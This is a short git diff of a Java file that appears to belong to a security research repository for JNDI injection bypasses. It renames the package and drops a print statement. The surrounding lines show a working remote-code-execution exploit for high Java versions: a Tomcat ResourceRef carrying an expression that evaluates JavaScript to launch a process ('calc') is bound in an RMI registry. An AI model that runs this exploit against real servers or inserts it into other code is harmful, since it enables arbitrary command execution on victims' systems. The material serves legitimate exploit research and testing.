@@ -1,4 +1,4 @@
-package cn.hungslabsec.JNDI.bypass;
+package bypass;
 
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import org.apache.naming.ResourceRef;
@@ -23,7 +23,6 @@ public class JNDIBypassHighJava {
         ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                 ".newInstance().getEngineByName(\"JavaScript\")" +
                 ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
-        System.out.println("[*]Evil command: calc");
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
         registry.bind("Object", referenceWrapper);
     }
